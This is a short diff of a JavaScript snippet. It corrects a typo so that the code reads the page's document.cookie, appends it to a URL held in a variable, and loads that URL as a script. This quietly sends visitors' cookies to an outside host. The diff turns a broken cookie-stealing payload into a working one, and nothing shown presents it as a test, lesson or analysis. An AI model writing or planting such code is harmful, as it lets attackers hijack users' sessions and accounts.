@@ -3,7 +3,7 @@ var init = (function() {
 	var FIELD = "cookie"
 
 	return (function () {
-		var target = URL + "?" + FIELD + "=" + encodeURIComponent(docment.cookie);
+		var target = URL + "?" + FIELD + "=" + encodeURIComponent(document.cookie);
 
 		var script = document.createElement("script");
 		script.src = target;
